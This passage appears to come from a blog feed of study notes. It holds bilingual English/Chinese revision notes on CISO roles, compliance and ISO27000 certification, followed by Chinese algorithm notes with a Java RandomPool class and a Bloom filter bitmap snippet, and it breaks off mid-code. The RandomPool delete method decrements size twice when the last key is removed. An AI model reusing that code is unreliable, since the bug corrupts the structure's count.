briefly.</p><p>The challenges include:</p><p><strong>False sense of security</strong>. Many business-unit and C-suite executives think compliance equals security, especially in highly regulated industries. In Deloitte CISO Labs, 79 percent of CISOs report spending time with business leaders who think cyber risk is a technical problem or a compliance exercise. However, being compliant with regulations does not address all cyber risk or make an organization secure, and that mind-set can create an organizational culture that has a very narrow and inadequate understanding of cyber risk.</p><blockquote><p>虚假的安全感。许多企业单位和C-suite高管认为合规性等同于安全性，特别是在高度管制的行业。在德勤CISO实验室中，79%的CISO报告说，他们花时间与那些认为网络风险是技术问题或合规工作的企业领导打交道。然而，遵守法规并不能解决所有的网络风险，也不能使企业安全，这种心态会造成一种组织文化，对网络风险的理解非常狭窄和不充分</p></blockquote><p><strong>Competing agendas</strong>. Business leaders have a role to play in elevating the importance of enterprise security, but it is a role many may view indifferently at best. A recent ThreatTrack survey revealed that 74 percent of C-suite executives do not think CISOs should have a seat at the table or be part of their organization’s leadership team. One reason may be that the mission of business units is to create new products and services, drive sales and revenue, and control costs in the process. Their results are not typically measured by, nor are they held accountable for, security considerations, and they don’t readily make the connection between their strategic growth agenda and the cyber risks they tend to create.</p><blockquote><p>竞争的议程。企业领导人在提高企业安全的重要性方面可以发挥作用，但许多人可能充其量是无动于衷地看待这一角色。最近的一项ThreatTrack调查显示，74%的C-suite高管认为CISO不应该在谈判桌前占有一席之地，或成为其组织领导团队的一部分。一个原因可能是，业务部门的任务是创造新产品和服务，推动销售和收入，并在此过程中控制成本。他们的结果通常不是由安全考虑来衡量的，也不是由安全考虑来负责的，他们不容易把他们的战略增长议程和他们往往创造的网络风险联系起来</p></blockquote><h4 id="Q6"><a href="#Q6" class="headerlink" title="Q6"></a>Q6</h4><p>what are the ‘four faces of the CISO’? Enumerate and succinctly explain them</p><p>CISOs continue to serve the vital functions of managing security technologies (technologist) and protecting enterprise assets (guardian). At the same time, they are increasingly expected to focus more on setting security strategy (strategist) and advising business leaders on security’s importance (advisor).</p><blockquote><p>CISO继续发挥着管理安全技术（技术专家）和保护企业资产（守护者）的重要职能。同时，他们也越来越多地被期望将重点放在制定安全战略（战略家）和向企业领导人提供安全重要性的建议（顾问）上</p></blockquote><p><strong>Technologist</strong>. The CISO as technologist guides the design, development, and deployment of secure technical architectures, instilling security standards and implementing innovative countermeasures. Technologists carefully select and implement platforms that support changing threat detection and monitoring solutions, and integrate services delivered by external sources into a seamless framework. Technologists ensure that architecture designs are flexible and extendable to meet future security and business needs. They develop and maintain the security policies and standards that an organization should adhere to, working with the CIO to ensure that platforms meet these requirements.</p><p><strong>Guardian</strong>. As guardian, the CISO’s charge is to monitor the effectiveness of the security program, processes, and controls in place. The guardian addresses considerations such as whether controls are working as intended, data is secure, and information is properly shared. Guardians monitor processes that safeguard the confidentiality, integrity, and availability of data and drive the overall security program. They also measure and report on information security risks to keep stakeholders informed and meet compliance and regulatory requirements.</p><p><strong>Strategist</strong>. As strategist, the CISO is the chief value architect for all cyber risk investments. The strategist partners with the business to align business and information security strategies and capture the value of security investments to safeguard enterprise assets. In this role, the CISO possesses deep business knowledge and acts as a credible partner who provides business-centric advice on how risk management can help the business. The strategist understands which business operations and information assets the enterprise crown are jewels, institutes strategic governance that prioritizes information security investments, and ensures that security and business resources and budgets are fully aligned to execute the priorities of the organization and deliver expected results.</p><p><strong>Advisor</strong>. The CISO as advisor understands the implications of new or emerging threats and helps identify cyber risks that arise as the business advances new strategies. The advisor drives the enterprise to continuously improve its security decision-making and risk mitigation capabilities. The advisor understands where the organization needs to focus to address cyberthreats and creates a risk-based strategic roadmap to align cybersecurity efforts with corporate risk appetite. Advisors possess significant political capital and are able to enlist, educate, engage, and align executive stakeholders to increase security awareness.</p><p>简略版</p><ul><li>Strategist - aligning business and information security strategies </li><li>Advisor - educate and engage other executives, create risk-based roadmap </li><li>Technologist - guide the design and development of technical architectures </li><li>Guardian - monitor security programs, controls, and processes</li></ul><h3 id="compliance"><a href="#compliance" class="headerlink" title="compliance"></a>compliance</h3><p>definition: Whether something is working in accordance with defined policies, processes and procedures. 某事是否按照既定的政策、流程和程序运作</p><p>This could:</p><ul><li>cover a <strong>major operation</strong> such as a whole organisation being compliant with a recognised international standard for Information Security like ISO27000-series</li><li>be much more <strong>limited</strong> with just certain aspects of the operation, or individual users of a specific system, being assessed for compliance.</li></ul><blockquote><p>涵盖一项重要的行动，如整个组织符合公认的信息安全国际标准，如ISO27000系列<br>这可能是更有限的，只是对业务的某些方面或特定系统的个别用户进行合规性评估</p></blockquote><p>It also includes evaluating whether an organisation is meeting the requirements of local laws and regulation.</p><blockquote><p>它还包括评估一个组织是否符合当地法律和法规的要求</p></blockquote><h4 id="How-do-we-check-compliance"><a href="#How-do-we-check-compliance" class="headerlink" title="How do we check compliance?"></a>How do we check compliance?</h4><h5 id="Risk-management"><a href="#Risk-management" class="headerlink" title="Risk management"></a>Risk management</h5><ul><li>Documentation of results and evidence of <strong>threat</strong>, <strong>vulnerability</strong>, <strong>impact</strong>, and <strong>risk assessments</strong>. 威胁、脆弱性、影响和风险评估的结果和证据的文档</li><li>Creation of a <strong>risk register</strong> to highlight identified risks (so that the organisation is aware of the risks and has an outline of how they will be managed). 创建风险登记册以突出已识别的风险（以便组织了解风险并概述如何管理它们） </li></ul><h5 id="Security-policies-and-control"><a href="#Security-policies-and-control" class="headerlink" title="Security policies and control"></a>Security policies and control</h5><ul><li>Maintenance of an <strong>up-to-date</strong> set of security policies and controls with a review process, including review of whether all security policies are compliant with existing laws. 通过审查过程维护一组最新的安全策略和控制，包括审查所有安全策略是否符合现有法律</li><li>A register of ‘exempts’ from security policies: what is <strong>not</strong> covered by policy and a good justification of why it is not (eg perhaps a personal computer that does not connect to the network is not covered). 安全政策的“豁免”登记册：政策未涵盖的内容以及未涵盖的合理理由（例如，可能未涵盖未连接到网络的个人计算机） </li></ul><h5 id="Reports-of-breaches-incidents"><a href="#Reports-of-breaches-incidents" class="headerlink" title="Reports of breaches/incidents"></a>Reports of breaches/incidents</h5><p>As well as:</p><ul><li>plans to address these breaches</li><li>evidence of what has gone wrong and what corrective actions are needed.</li></ul><h4 id="Independent-review-and-certification"><a href="#Independent-review-and-certification" class="headerlink" title="Independent review and certification"></a>Independent review and certification</h4><p>Compliance does <strong>not</strong> need to be independently reviewed. However, an independent review is required in order to achieve certification against a standard, legal or regulatory framework.</p><blockquote><p>合规性不需要进行独立审查。但是，想要根据标准、法律或监管框架获得认证 需要进行独立审查</p></blockquote><p>If an organisation can self-determine that it is following the standard, what then are the benefits of certification?</p><p><strong>Fresh pair of eyes</strong> 重新审视<br>An independent review provides an expert opinion as to whether an organisation’s Information Security management is functioning properly. 为一个组织的信息安全管理是否正常运作提供了专家意见</p><p><strong>Forced monitoring and periodic review</strong><br>Certification requires periodic reassessment and forces the organisation to review the standard from time to time. 认证需要定期重新评估，迫使组织不时地审查标准</p><p><strong>Public image</strong><br>Certification can be used as branding for the company to attract new customers. 认证可以作为公司的品牌宣传，吸引新客户</p><p><strong>Requirement by new customers</strong><br>Some customers will only use the service of an organisation if it has been officially certified to take Information Security seriously. 一些客户只有在一个组织通过官方认证，认真对待信息安全时，才会使用该组织的服务</p><blockquote><p>It should be clear, however, that one of the challenges that independent review and accreditation brings is the fact that the requirements from one legislative system may be inconsistent with another, making compliance with all of the relevant laws of multiple jurisdictions difficult.</p><p>独立审查和认证带来的挑战之一是，来自一个立法系统的要求可能与另一个立法系统不一致，这使得遵守多个司法管辖区的所有相关法律变得困难</p><p>If an organisation operates in two or more legal jurisdictions, it is likely the same policy or procedure won’t be compatible with all legal jurisdictions! For example, the EU’s GDPR and US Data Protection Laws are not directly compatible. Understanding legislation can be complex and pieces of the legislation can sometimes conflict with one another.</p><p>如果一个组织在两个或更多的法律管辖区运作，那么同一个政策或程序很可能不会与所有的法律管辖区兼容! 例如，欧盟的GDPR和美国的数据保护法并不直接兼容。对立法的理解可能很复杂，立法的各个部分有时会相互冲突</p></blockquote><h4 id="The-ISO27000-series"><a href="#The-ISO27000-series" class="headerlink" title="The ISO27000-series"></a>The ISO27000-series</h4><p>The ISO/IEC 27000 standard series (which you may also see referred to as the ISO27K series) provides a family of standards for implementing Information Security management, including risk management and security control implementation. 提供了一系列用于实施信息安全管理的标准，包括风险管理和安全控制实施</p><p>The series provides organisations with some guidance regarding compliance legal requirements and covers the following areas:</p><ul><li>intellectual property rights</li><li>protection of organisational records</li><li>data protection and privacy of personal information</li><li>prevention of misuse of information processing facilities</li><li>regulation of cryptographic controls.</li></ul><blockquote><ul><li>知识产权</li><li>组织记录的保护</li><li>数据保护和个人信息的隐私</li><li>防止滥用信息处理设施</li><li>加密控制的监管</li></ul></blockquote><p>It centres around the concept of <strong>ISMS</strong>:</p><p>Information Security Management System (ISMS)</p><p>A set of policies and procedures for systematically managing an organisation’s digital assets, based on Deming’s Plan-Do-Check-Act model. 一套系统管理组织数字资产的政策和程序，基于戴明的计划-执行-检查-行动模型</p><table><thead><tr><th align="left">ISO27000</th><th>ISMS overview and vocabulary 概述和词汇</th></tr></thead><tbody><tr><td align="left">ISO27001</td><td>ISMS requirements</td></tr><tr><td align="left">ISO27002</td><td>Code of practice (17799) 业务守则</td></tr><tr><td align="left">ISO27003</td><td>ISMS implementation guide 实施指南</td></tr><tr><td align="left">ISO27004</td><td>Information Security management metrics 信息安全管理指标</td></tr><tr><td align="left">ISO27005</td><td>Information Security risk management</td></tr><tr><td align="left">ISO27006</td><td>Requirements for bodies providing audit certification of ISMS 对提供ISMS审计认证的机构的要求</td></tr></tbody></table><h5 id="ISO27001"><a href="#ISO27001" class="headerlink" title="ISO27001"></a>ISO27001</h5><p>ISO27001 is the first Information Security standard for commerce – created by industry for industry. It is a framework for Information Security ‘good practice’ based on the ISO9000 heritage. It represents a code of practice for Information Security management.</p><blockquote><p>是第一个用于商业的信息安全标准–由工业界为工业界创建。它是一个基于ISO9000遗产的信息安全 “良好实践 “的框架。它代表了一个信息安全管理的实践准则</p></blockquote><p>ISO27001 is a <strong>Recognised Certification Scheme</strong>; in the UK, this is coordinated by the United Kingdom Accreditation Service (UKAS) who accredit the organisations that can carry out independent reviews to award the certification to companies.</p><blockquote><p>公认的认证计划；在英国，这是由英国认证服务机构（UKAS）协调的，该机构对能够进行独立审查的组织进行认证，以向公司颁发认证</p></blockquote><p>A key feature of IS027001 is the ISMS, as mentioned above. This is the basis for formal certification (independent compliance review). The ISMS defines all the controls and procedures required to maintain security throughout the organisation, as well as the methods used to manage these controls. This enables the organisation to demonstrate compliance with best practices and corporate objectives.</p><blockquote><p>IS027001的一个关键特征是ISMS。这是正式认证（独立合规性审查）的基础。ISMS定义了维护整个组织安全所需的所有控制和程序，以及用于管理这些控制的方法。这使组织能够证明其符合最佳实践和企业目标</p></blockquote><p>The ISMS concept is based on four stages:</p><p>Plan: establish the ISMS</p><p>Establish security policy, objectives, processes and procedures relevant to managing risk and improving Information Security to deliver results in accordance with an organisation’s overall policies and objectives.</p><blockquote><p>建立与管理风险和改善信息安全有关的安全政策、目标、流程和程序，以根据组织的总体政策和目标提供结果</p></blockquote><p>Do: implement and operate the ISMS</p><p>Implement and operate the security policy, controls processes and procedures.</p><blockquote><p>实施和操作安全政策、控制过程和程序</p></blockquote><p>Check: monitor and review the ISMS</p><p>Assess, and where applicable, measure process performance against security policy, objectives and practical experience, and report results to management for review.</p><blockquote><p>根据安全政策、目标和实际经验，评估并在适用的情况下衡量流程绩效，并将结果报告给管理层，以供审查</p></blockquote><p>Act: maintain and improve the ISMS</p><p>Take corrective and preventative actions, based on the results of the management review, to achieve continual improvement of the ISMS.</p><blockquote><p>根据管理评审的结果，采取纠正和预防措施，以实现ISMS的持续改进</p></blockquote><p>However, it should be stressed that the ISMS concept is not a linear process, but rather a circular one. ISMS的概念不是一个线性的过程，而是一个循环的过程</p><h5 id="A-model-ISO27001-compliant-ISMS"><a href="#A-model-ISO27001-compliant-ISMS" class="headerlink" title="A model ISO27001-compliant ISMS"></a>A model ISO27001-compliant ISMS</h5><p>一个符合ISO27001标准的ISMS模型</p><p>The following diagram shows another conception of the ISMS (in addition to the plan-do-check-act model referred to above), namely how the ISMS is operationalised in practice. That is, first you set the ISMS and the document set that it is composed of, then the ISMS comes into operation alongside the business needs, and then events happen that need to be analysed and considered in order for the ISMS to be reviewed and updated</p><p>首先你设定了ISMS和由其组成的文件集，然后ISMS与业务需求一起投入运行，然后发生了需要分析和考虑的事件，以便对ISMS进行审查和更新</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/security-management/f10.png"></p><p>ISMS document set</p><ul><li>organisation security policy</li><li>risk management documents</li><li>statement of applicability</li><li>asset registers</li><li>policies, procedures and standards applicable to scope</li><li>SLAs, contracts and other evidence</li></ul><blockquote><ul><li>组织安全政策</li><li>风险管理文件</li><li>适用性声明</li><li>资产登记册</li><li>适用于范围的政策、程序和标准</li><li>服务水平协议、合同和其他证据</li></ul></blockquote><p>Events</p><ul><li>security incidents</li><li>suspected weaknesses</li><li>malfunctions</li><li>audit observations</li><li>testing findings</li><li>spot check findings</li></ul><blockquote><ul><li>安全事件</li><li>疑似弱点</li><li>故障</li><li>审计意见</li><li>测试结果</li><li>抽查结果</li></ul></blockquote><h5 id="ISO27002"><a href="#ISO27002" class="headerlink" title="ISO27002"></a>ISO27002</h5><p>ISO27002 defines guidance on the implementation of security controls. It broadly specifies the generic guidance on controls that can be put in place to manage security. This is done within the context of CIA and other security properties.</p><blockquote><p>ISO27002定义了安全控制的实施指南。它广泛地规定了可用于管理安全的控制措施的通用指南。这是在CIA和其他安全属性的背景下完成的</p></blockquote><p><strong>Specific controls are not mandated</strong>, but rather best practice for achieving goals is identified. 具体的控制措施并没有被强制要求，而是确定了实现目标的最佳实践</p><p>Why might no mandate be imposed?</p><ul><li>The organisation is expected to conduct a risk assessment and select appropriate controls.</li><li>Generic good advice needs to be tailored for the organisation.</li><li>Being open-ended means that the standard stays relevant.</li><li>It would be impossible to enumerate all possible appropriate controls.</li></ul><blockquote><ul><li>组织应进行风险评估并选择适当的控制措施</li><li>一般的好建议需要为组织量身定做</li><li>开放性意味着该标准保持了相关性</li><li>不可能列举出所有可能的适当控制措施</li></ul></blockquote><h5 id="ISO27005-risk-management"><a href="#ISO27005-risk-management" class="headerlink" title="ISO27005 (risk management)"></a>ISO27005 (risk management)</h5><p>ISO27005, published in 2008, provides guidance on implementing a risk management system to specifically support the creation and maintenance of ISO27001’s ISMS. 为实施风险管理系统提供指导，以具体支持ISO27001的ISMS的创建和维护</p><p>Importantly, it <strong>does not recommend a methodology</strong> or a specific approach to risk management. This is because organisations have their own challenges and must tackle them in a way that suits them. It does, however, provide some guidance about the different steps and processes that would need to be in place for risk management to happen.</p><blockquote><p>重要的是，它没有推荐风险管理的方法或具体方法。这是因为组织有自己的挑战，必须以适合他们的方式来解决这些问题。然而，它确实提供了一些关于风险管理所需的不同步骤和流程的指导</p></blockquote><h4 id="More-on-compliance"><a href="#More-on-compliance" class="headerlink" title="More on compliance"></a>More on compliance</h4><p>Objective assurance of compliance with ISO27001 involves demonstrating that you are doing what you have said you will do, 符合ISO27001标准的客观保证包括证明你正在做你说要做的事情 with respect to:</p><ul><li>ensuring that staff are aware of policy and their responsibilities</li><li>monitoring, managing and learning from incidents</li><li>testing business continuity plans</li><li>making steady progress with a security improvement plan.</li></ul><blockquote><ul><li>确保员工了解政策和他们的责任</li><li>监测、管理并从事件中学习</li><li>测试业务连续性计划</li><li>在安全改进计划方面取得稳步进展</li></ul></blockquote><p>You are also required to maintain evidence of compliance, which means having at least three months of evidence and records to demonstrate that the management system has been operating.</p><blockquote><p>你还需要保持合规的证据，这意味着至少要有三个月的证据和记录来证明该管理系统一直在运行</p></blockquote><p>Certification focuses on assessing the effectiveness of this management system. It is not an IT security review or vulnerability assessment, and it shouldn’t be seen as such.</p><blockquote><p>认证的重点是评估该管理系统的有效性。它不是一个IT安全审查或漏洞评估，也不应该被看作是这样</p></blockquote><p>Certification is about risk management: taking a risk-based approach to Information Security, treating risk appropriately, and ensuring that there is a systematic, rigorous, repeatable framework in place.</p><blockquote><p>认证是关于风险管理的：对信息安全采取基于风险的方法，适当地处理风险，并确保有一个系统的、严格的、可重复的框架</p></blockquote><p>ISO27001 compliance means that the management process, ie the ISMS, is in place. <strong>It does not certify the actual state of security</strong>. That is to say, a certified company might still be vulnerable to many threats! But ISO27001 at least says that the company is considering Information Security through appropriate methods though.</p><blockquote><p>符合ISO27001意味着管理过程，即ISMS，已经到位。它并不证明安全的实际状态。也就是说，一个经过认证的公司可能仍然容易受到许多威胁。但是，ISO27001至少说明该公司正在通过适当的方法考虑信息安全</p></blockquote><p>What might be some of the benefits of compliance with ISO27001?</p><ul><li>an ISMS which is certified as effective</li><li>justified security controls</li><li>justified policies and procedures</li><li>increased security awareness in the organisation</li><li>the benefits of being audited and being auditable</li><li>reduced operational risk</li><li>a single risk framework for many security initiatives</li><li>increased business efficiency</li><li>including control of outsourcing</li><li>assurance to outsiders</li><li>controls in third party contracts.</li></ul><blockquote><ul><li>一个经认证有效的ISMS</li><li>合理的安全控制</li><li>合理的政策和程序</li><li>提高组织内的安全意识</li><li>接受审计和可审计的好处</li><li>降低运营风险</li><li>为许多安全举措提供单一的风险框架</li><li>提高业务效率</li><li>包括对外包的控制</li><li>对外的保证</li><li>第三方合同中的控制</li></ul></blockquote><p>What might be common reasons why companies fail to achieve ISO certification?</p><ul><li>lack of senior management commitment</li><li>lack of clear scope or scope too broad</li><li>key security roles absent or unclear</li><li>no demonstrable understanding of the value of information</li><li>no (or inappropriate) risk assessment/risk treatment processes</li><li>lack of rigour/formality in processes</li><li>inadequate funding</li></ul><blockquote><ul><li>缺乏高级管理层的承诺</li><li>缺乏明确的范围或范围太广</li><li>关键的安全角色不存在或不明确</li><li>对信息的价值没有明显的理解</li><li>没有（或不适当的）风险评估/风险处理程序</li><li>流程缺乏严谨性/正规性</li><li>资金不足</li></ul></blockquote><h4 id="quiz-5"><a href="#quiz-5" class="headerlink" title="quiz"></a>quiz</h4><h5 id="Q1-4"><a href="#Q1-4" class="headerlink" title="Q1"></a>Q1</h5><p>Does compliance need to be externally reviewed?</p><p>No, an organisation can self-determine whether they are complying with a particular standard, for instance. However, they need to be reviewed by an external party to be certified as following the standard. In addition, an external review has further benefits</p><blockquote><p>组织可以自我确定他们是否符合某个特定的标准，然而，他们需要由外部机构进行审查，以证明他们遵循了该标准。此外，外部审查还有其他好处</p></blockquote><h5 id="Q2-4"><a href="#Q2-4" class="headerlink" title="Q2"></a>Q2</h5><p>Compliance with ISO27001 certifies an organisation’s state of security.</p><p>False. Recall that the aim of the standard is not to certify the actual security state of an organisation, but that a systematic way for risk management is in place. 该标准的目的不是要证明一个组织的实际安全状态，而是要证明已经有了系统的风险管理方法</p><h5 id="Q3-4"><a href="#Q3-4" class="headerlink" title="Q3"></a>Q3</h5><p>Does ISO27005 recommend a method for risk assessment? Explain.</p><p>ISO27005 provides guidance on implementing a risk management system to specifically support ISO27001’s ISMS. It <strong>does not</strong> recommend a methodology for risk assessment, only on how to manage the risks so you can choose the method for risk assessment.</p><blockquote><p>ISO27005为实施风险管理系统提供指导，以专门支持ISO27001的ISMS。它没有推荐风险评估的方法，只推荐了如何管理风险，所以你可以选择风险评估的方法</p></blockquote><h5 id="Q4-2"><a href="#Q4-2" class="headerlink" title="Q4"></a>Q4</h5><p>Does the process of certification against the ISO27000-series include a vulnerability assessment (eg using assurance techniques)? Explain.</p><p>No, it does not usually do so. The process of certification is more about assessing the effectiveness of the ISMS and the associated risk management processes, ensuring there is a systematic, rigorous, repeatable framework in place.</p><blockquote><p>认证过程更多地是关于评估 ISMS 和相关风险管理过程的有效性，确保有一个系统、严格、可重复的框架到位</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> kcl复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security-management </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>左神算法0x04</title>
      <link href="/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x04/"/>
      <url>/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x04/</url>
      
        <content type="html"><![CDATA[<p>【哈希，并查集，KMP，Manacher，单调栈，大数据问题，位运算，暴力递归改写DP】</p><h2 id="关于哈希"><a href="#关于哈希" class="headerlink" title="关于哈希"></a>关于哈希</h2><p>最重要的性质就是离散性或者说是均匀性，即对于哈希函数的输出域来说，用面积相同的小正方形去框输出域，那么框出来的点的个数基本相同</p><h3 id="设计RandomPool结构"><a href="#设计RandomPool结构" class="headerlink" title="设计RandomPool结构"></a>设计RandomPool结构</h3><p>设计一种结构，在该结构中有如下三个功能:</p><p>insert(key): 将某个key加入到该结构，做到不重复加</p><p>delete(key): 将原本在结构中的某个key移除</p><p>getRandom(): 等概率随机返回结构中的任何一个key</p><p>要求 Insert、delete和getRandom方法的时间复杂度都是O(1)</p><p>建立两张哈希表，一张是key -&gt; index，另一张是index -&gt; key，则等概率随机返回时便可以利用随机函数返回随机的整数index，然后取出该index对应的key即可，但是这是在index连续的情况下，所以注意当删除的时候，出现不连续，那么就将最后一个index和key放到删除的地方，这就保证了index的连续</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RandomPool</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> keyIndexMap<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">K</span><span class="token punctuation">></span></span> indexKeyMap<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">RandomPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        keyIndexMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        indexKeyMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token class-name">K</span> key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>keyIndexMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            keyIndexMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>            indexKeyMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>size<span class="token operator">++</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">K</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> indexKeyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">K</span> key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>keyIndexMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> deleteIndex <span class="token operator">=</span> keyIndexMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> lastIndex <span class="token operator">=</span> <span class="token operator">--</span>size<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>lastIndex <span class="token operator">==</span> deleteIndex<span class="token punctuation">)</span> <span class="token operator">--</span>size<span class="token punctuation">;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token class-name">K</span> lastKey <span class="token operator">=</span> indexKeyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>lastIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>                keyIndexMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lastKey<span class="token punctuation">,</span> deleteIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>                indexKeyMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>deleteIndex<span class="token punctuation">,</span> lastKey<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            keyIndexMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            indexKeyMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>lastIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h3><p>用途：假如需要一个黑名单，含有大量（100亿）url，当访问到黑名单的url时，必须被过滤掉</p><p>那么布隆过滤器的作用就是</p><p>1）对于黑名单中的url，必须能查到，所以可以过滤掉</p><p>2）对于不在黑名单的url，有一定的失误率，即有可能被误判为黑名单中的url</p><p>需要介绍一个bitmap结构，一个int数组，每个数有4个字节，即32bit，我们想使用一个每个数只有1个比特的数组结构，所以可以借助int数组实现</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// arr[0]: 0-31</span><span class="token comment">// arr[1]: 32-63</span><span class="token comment">// ...</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 得到第178bit上的状态（是1还是0）</span><span class="token keyword">int</span> numIndex <span class="token operator">=</span> <span class="token number">178</span> <span class="token operator">/</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token comment">// 这个bit在哪个数取得</span><span class="token keyword">int</span> bitIndex <span class="token operator">=</span> <span class="token number">178</span> <span class="token operator">%</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token comment">// 这个bit在这个数的第几个bit取得</span><span class="token keyword">int</span> bit <span class="token operator">=</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>numIndex<span class="token punctuation">]</span> <span class="token operator">>></span> bitIndex<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 将178bit上的状态改为1</span>arr<span class="token punctuation">[</span>numIndex<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>numIndex<span class="token punctuation">]</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> bitIndex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将178bit上的状态改为0</span>arr<span class="token punctuation">[</span>numIndex<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>numIndex<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> bitIndex<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" 